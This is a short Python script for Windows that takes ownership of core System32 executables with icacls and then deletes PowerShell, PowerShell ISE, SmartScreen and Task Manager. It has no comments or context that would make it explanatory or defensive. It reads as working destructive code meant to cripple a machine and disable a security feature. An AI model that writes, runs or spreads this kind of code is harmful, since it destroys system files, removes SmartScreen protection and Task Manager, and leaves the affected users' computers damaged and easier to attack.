#!/usr/bin/python
#coding:utf-8
import os, sys, time
# Get the current username
usr = os.environ["USERNAME"]
# Function to get full permission on powershell process windows
def icc_powershell():
    procs = ['powershell.exe', 'powershell_ise.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s /grant %s:F " %(proc, usr)
        os.system(ica)

# Function to get full permission on main process windows
def icc_sys32():
    procs = ['cmd.exe', 'smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\%s /grant %s:F " %(proc, usr)
        os.system(ica)

# Function to delete all process in the directory
def remove_proc():
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for proc in pwr_sh:
        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
        os.system(cmd)
    procs = ['smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        cmd = "del \\windows\\system32\\%s " %(proc)
        os.system(cmd)
